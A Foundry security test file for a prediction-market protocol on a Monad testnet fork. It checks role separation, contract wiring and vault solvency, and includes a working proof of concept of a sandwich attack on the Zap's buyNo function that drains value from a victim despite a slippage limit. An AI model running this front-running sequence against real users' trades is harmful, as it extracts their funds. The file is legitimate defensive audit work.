// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import {Resolver} from "../../../src/Resolver.sol";
import {CollateralVault} from "../../../src/CollateralVault.sol";
import {StrikeFactory} from "../../../src/StrikeFactory.sol";
import {IsothermZap} from "../../../src/IsothermZap.sol";
import {CivilDate} from "../../utils/CivilDate.sol";

interface IFaucetV1 {
    function requestFunds(address to) external;
}

interface IKuruRouterV1 {
    function deployProxy(
        uint8 t,
        address base,
        address quote,
        uint96 sizePrecision,
        uint32 pricePrecision,
        uint32 tickSize,
        uint96 minSize,
        uint96 maxSize,
        uint256 takerFeeBps,
        uint256 makerFeeBps,
        uint96 ammSpread
    ) external returns (address);
}

interface IKuruBookV1 {
    function batchUpdate(
        uint32[] calldata buyPrices,
        uint96[] calldata buySizes,
        uint32[] calldata sellPrices,
        uint96[] calldata sellSizes,
        uint40[] calldata cancel,
        bool postOnly
    ) external;
    function placeAndExecuteMarketSell(uint96 size, uint256 minOut, bool isMargin, bool fok)
        external
        payable
        returns (uint256);
    function bestBidAsk() external view returns (uint256, uint256);
}

interface IMarginV1 {
    function deposit(address user, address token, uint256 amount) external payable;
}

/// @notice v1 security diff review against the DEPLOYED v1 contracts (addresses from deployments/testnet.json) on a
///         local fork of Monad testnet: live configuration checks, live solvency, and the Zap.buyNo sandwich on the
///         real Kuru v1 matching engine with the deployed Zap bytecode. Skipped unless MONAD_TESTNET_RPC is set.
/// Run: MONAD_TESTNET_RPC=https://testnet-rpc.monad.xyz [FORK_BLOCK=n] forge test --match-path 'test/security/v1/V1LiveFork.t.sol' -vv
contract V1LiveForkTest is Test {
    IERC20 constant AUSD = IERC20(0xa9012a055bd4e0eDfF8Ce09f960291C09D5322dC);
    IFaucetV1 constant FAUCET = IFaucetV1(0xd236c18D274E54FAccC3dd9DDA4b27965a73ee6C);
    IKuruRouterV1 constant ROUTER = IKuruRouterV1(0x7EFbE105Ca7415dE98F96622173458ac1c054630);
    IMarginV1 constant MARGIN = IMarginV1(0xd029C2D98ff85D8F64799017fE00a59B1159CE02);

    bool forked;
    Resolver resolver;
    CollateralVault vault;
    IsothermZap zap;
    address ownerAddr;
    address guardianAddr;
    address attesterAddr;
    address operatorAddr;

    function setUp() public {
        string memory rpc = vm.envOr("MONAD_TESTNET_RPC", string(""));
        if (bytes(rpc).length == 0) return;
        uint256 blk = vm.envOr("FORK_BLOCK", uint256(0));
        if (blk == 0) vm.createSelectFork(rpc);
        else vm.createSelectFork(rpc, blk);
        forked = true;
        string memory j = vm.readFile(string.concat(vm.projectRoot(), "/deployments/testnet.json"));
        resolver = Resolver(vm.parseJsonAddress(j, ".resolver"));
        vault = CollateralVault(vm.parseJsonAddress(j, ".vault"));
        zap = IsothermZap(vm.parseJsonAddress(j, ".zap"));
        ownerAddr = vm.parseJsonAddress(j, ".roles.owner");
        guardianAddr = vm.parseJsonAddress(j, ".roles.guardian");
        attesterAddr = vm.parseJsonAddress(j, ".roles.attester");
        operatorAddr = vm.parseJsonAddress(j, ".roles.operator");
    }

    modifier onlyFork() {
        if (!forked) {
            vm.skip(true);
            return;
        }
        _;
    }

    /// Live configuration: roles separated as claimed, wiring consistent, every live series has a canonical book that
    /// still validates, nothing gated, and the vault holds at least the sum of all series collateral.
    function test_live_configRolesWiringAndSolvency() public onlyFork {
        assertEq(resolver.owner(), ownerAddr);
        assertEq(vault.owner(), ownerAddr);
        assertEq(resolver.attester(), attesterAddr);
        assertEq(resolver.guardian(), guardianAddr);
        assertEq(vault.guardian(), guardianAddr);
        assertTrue(vault.isOperator(operatorAddr));
        address[4] memory roles = [ownerAddr, guardianAddr, attesterAddr, operatorAddr];
        for (uint256 i; i < 4; ++i) {
            for (uint256 k = i + 1; k < 4; ++k) {
                assertTrue(roles[i] != roles[k], "roles distinct");
            }
        }
        assertFalse(vault.isOperator(attesterAddr));
        assertFalse(vault.isOperator(guardianAddr));
        assertEq(address(vault.resolver()), address(resolver));
        assertEq(address(zap.vault()), address(vault));
        assertEq(address(zap.collateral()), address(AUSD));
        assertEq(address(vault.collateral()), address(AUSD));
        assertEq(resolver.challengeWindow(), 900);
        assertEq(resolver.STALE_WINDOW(), 48 hours);
        console2.log("resolver forwarder", resolver.forwarder());
        console2.log("resolver paused", resolver.paused());
        console2.log("pendingOwner resolver/vault", resolver.pendingOwner(), vault.pendingOwner());

        uint256 sum;
        uint256 n = vault.ladderCount();
        console2.log("live ladders", n);
        for (uint256 i; i < n; ++i) {
            StrikeFactory.LadderRef memory l = vault.ladderAt(i);
            bytes32[] memory ids = vault.ladderSeries(l.station, l.date);
            for (uint256 k; k < ids.length; ++k) {
                StrikeFactory.Series memory s = vault.getSeries(ids[k]);
                sum += s.collateral;
                assertFalse(s.gated, "live series not gated");
                assertLe(s.closeTime, resolver.dayEnd(l.station, l.date), "closeTime <= dayEnd");
                address m = zap.canonicalMarket(ids[k]);
                console2.log("strike / collateral / market", uint256(int256(s.strikeC)), s.collateral, m);
                if (m != address(0)) assertTrue(zap.validateMarket(ids[k], m), "canonical book still validates");
            }
        }
        uint256 bal = AUSD.balanceOf(address(vault));
        console2.log("vault AUSD / sum(collateral)", bal, sum);
        assertGe(bal, sum, "vault solvent");
    }

    /// RESIDUAL (Medium) on the deployed Zap + real Kuru v1: the buyNo sandwich. A fresh RJTT series is created by
    /// impersonating the live operator (fork only), its canonical book is a real Kuru market with a maker bid of
    /// 100 YES @ 0.43. The front-runner sells into that bid and rests 50 YES @ 0.001; the victim's buyNo with a 2%
    /// slippage minAusdBack still succeeds, at ~0.999 AUSD per NO for half the NO.
    function test_live_RESIDUAL_buyNoSandwichOnRealKuruAndDeployedZap() public onlyFork {
        (bytes32 sid, address yesTok, address market) = _freshSeriesWithCanonicalBook();
        IERC20 yes = IERC20(yesTok);
        address maker = makeAddr("v1-maker");
        address attacker = makeAddr("v1-attacker");
        address victim = makeAddr("v1-victim");
        _faucetTo(maker, 500e6);
        _faucetTo(attacker, 200e6);
        _faucetTo(victim, 100e6);

        // maker: resting bid 100 YES @ 0.43 backed by AUSD margin
        vm.startPrank(maker);
        AUSD.approve(address(MARGIN), type(uint256).max);
        MARGIN.deposit(maker, address(AUSD), 43e6);
        _bid(market, 4300, 100e6);
        vm.stopPrank();
        (uint256 bb,) = IKuruBookV1(market).bestBidAsk();
        console2.log("best bid before (1e18 scale)", bb);

        uint256 ausdIn = 100e6;
        uint256 minBack = ausdIn * 4300 / 1e4 * 98 / 100; // victim's quote: 43 AUSD back, 2% slippage

        // front-run
        vm.startPrank(attacker);
        AUSD.approve(address(vault), type(uint256).max);
        vault.mintSet(sid, 100e6);
        yes.approve(market, type(uint256).max);
        IKuruBookV1(market).placeAndExecuteMarketSell(100e6, 0, false, false);
        AUSD.approve(address(MARGIN), type(uint256).max);
        MARGIN.deposit(attacker, address(AUSD), 1e6);
        _bid(market, 10, 50e6); // 50 YES @ 0.001
        vm.stopPrank();

        // victim
        vm.startPrank(victim);
        AUSD.approve(address(zap), type(uint256).max);
        (uint256 noOut, uint256 ausdBack) = zap.buyNo(sid, market, ausdIn, minBack, victim);
        vm.stopPrank();
        uint256 paid = ausdIn - ausdBack;
        console2.log("victim: NO out / AUSD paid", noOut, paid);
        console2.log("victim price per NO (1e6) vs quoted 570000", paid * 1e6 / noOut);
        assertGe(ausdBack, minBack);
        assertEq(noOut, 50e6, "only half the NO");
        assertGt(paid * 1e6 / noOut, 0.99e6, "> 0.99 per NO");
    }

    // ------------------------------------------------------------------------------------------------

    function _freshSeriesWithCanonicalBook() internal returns (bytes32 sid, address yesTok, address market) {
        bytes4 st = "RJTT";
        uint32 date = CivilDate.localDate(block.timestamp + 2 days, 9 hours);
        int16 strike = 40;
        while (address(vault.getSeries(vault.seriesIdOf(st, date, strike)).yes) != address(0)) ++strike;
        uint64 close = uint64(resolver.dayEnd(st, date) - 1 hours);
        vm.prank(operatorAddr);
        sid = vault.createSeries(st, date, strike, close);
        yesTok = address(vault.getSeries(sid).yes);
        market = ROUTER.deployProxy(0, yesTok, address(AUSD), 1e6, 1e4, 10, 1e6, 1e12, 10, 0, 100);
        vm.prank(operatorAddr);
        zap.setCanonicalMarket(sid, market);
        assertEq(zap.canonicalMarket(sid), market);
    }

    function _faucetTo(address to, uint256 amount) internal {
        address funder = makeAddr("v1-funder");
        if (AUSD.balanceOf(funder) < amount) {
            for (uint256 i; i < 3; ++i) {
                vm.prank(funder);
                try FAUCET.requestFunds(funder) {
                    break;
                } catch {
                    vm.warp(block.timestamp + 61); // global 60 s faucet cooldown
                }
            }
        }
        vm.prank(funder);
        AUSD.transfer(to, amount);
    }

    function _bid(address m, uint32 price, uint96 size) internal {
        uint32[] memory bp = new uint32[](1);
        uint96[] memory bs = new uint96[](1);
        (bp[0], bs[0]) = (price, size);
        IKuruBookV1(m).batchUpdate(bp, bs, new uint32[](0), new uint96[](0), new uint40[](0), true);
    }
}
